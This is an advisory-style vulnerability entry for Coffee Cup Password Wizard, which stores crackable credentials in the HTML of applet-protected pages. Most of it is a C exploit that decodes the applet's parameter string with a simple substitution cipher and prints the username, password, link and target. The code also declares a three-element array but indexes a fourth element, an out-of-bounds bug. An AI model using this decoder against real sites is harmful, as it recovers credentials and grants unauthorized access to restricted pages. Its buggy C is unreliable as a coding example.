source: http://www.securityfocus.com/bid/7023/info

A problem with the software may make it possible for remote users to gain unauthorized access to restricted resources.

This vulnerability exists in Password Wizard configured to generate Java applets to password protect pages. Specifically, the authentication credentials are stored in the HTML code. The credentials may be encrypted using an algorithm that can be cracked by an attacker.

An attacker can simply view the HTML source code to obtain authentication credentials.



// Exploit for Coffee Cup Password Wizard 
// By THR (admin@swesign.com)

#include <stdio.h>
#include <stdlib.h>

int main(void) {
	char *passwd, *uname, *url, *target;
	char param[] = "6|4|36|0|cftzmapuxnrsjibgwykqvleodhlfegvwcwlczccg://qqq.axbbwwahg.axe/enyyvw.zcev"; 
	char enc[1024];
	char dec[1024];
	char tmp[5];
	int size[3];
	int a=0,x=0,y=0,z=0;
	while(param[x]) {
		if(y<=3) {
			if(param[x]=='|') {
				tmp[a]=0;
				a=0;
				size[y]=atoi(tmp);
				y++;
			} else {
				tmp[a]=param[x];
				a++;
			}
		} else {
			enc[z]=param[x];
			z++;
		}
		x++;
	}
	enc[z]=0;
	x=0;
	while(enc[x]) {
		if(enc[x]>=65 && enc[x]<=90)
			dec[x]=enc[enc[x]-39];
		else
			if(enc[x]>=97 && enc[x]<=122)
				dec[x]=enc[enc[x]-97];
			else
				dec[x]=enc[x];
		x++;
	}
	dec[x]=0;
	if (!(uname = (char*) malloc((size[0]+1) * sizeof(char))) ||
		!(passwd = (char*) malloc((size[1]+1) * sizeof(char))) ||
		!(url = (char*) malloc((size[2]+1) * sizeof(char))) ||
		!(target = (char*) malloc((size[3]+1) * sizeof(char)))) {
		printf("Memory error\n");
		return(1);
	}
	y=0;
	z=26;
	for(x=z,y=0;x<size[0]+z;x++,y++)
		uname[y]=dec[x];
	uname[y]=0;
	z+=size[0];
	for(x=z,y=0;x<size[1]+z;x++,y++)
		passwd[y]=dec[x];
	passwd[y]=0;
	z+=size[1];
	for(x=z,y=0;x<size[2]+z;x++,y++)
		url[y]=dec[x];
	url[y]=0;
	z+=size[2];
	for(x=z,y=0;x<size[3]+z;x++,y++)
		target[y]=dec[x];
	target[y]=0;

	printf ("User: \t\t%s\nPassword: \t%s\nLink: \t\t%s\nTarget: \t%s\n",uname, passwd, url, target); 

	free (passwd);
	free (uname);
	free (url);
	free (target);
	return(0);
}